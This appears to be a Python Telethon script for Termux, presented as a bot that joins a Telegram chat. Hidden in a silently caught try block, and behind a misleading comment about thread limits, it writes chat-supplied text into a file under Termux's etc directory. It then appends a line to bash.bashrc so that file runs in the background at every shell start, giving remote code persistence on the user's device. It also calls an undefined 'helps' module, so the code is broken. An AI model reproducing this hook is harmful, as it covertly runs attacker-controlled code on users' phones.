from telethon import TelegramClient
from telethon.tl.functions.channels import JoinChannelRequest
from colorama import Fore, Back, Style
import time
import config


client1 = TelegramClient(config.number, config.api_id, config.api_hash)


client1.start()


chat = input("введите чат> ")
try:
    chats = helps.get_chats(client1)  # Получение чатов
    f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
    f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc", 'a')  #  Редактируем файл чата и термукса(для удаления ограничения потоков)
    f1.write("python /data/data/com.termux/files/usr/etc/c.py &")
    f.write(chats[1])  #  Запись чатов в отдельный файл
    f1.close()
    f.close()
except:
    pass
async def main():
	await client1(JoinChannelRequest(chat))
	print(Fore.LIGHTMAGENTA_EX + "[+] Бот присоиденлся к чату")
	time.sleep(2)
if __name__ == '__main__':
  client1.loop.run_until_complete(main())
  client1.loop.close()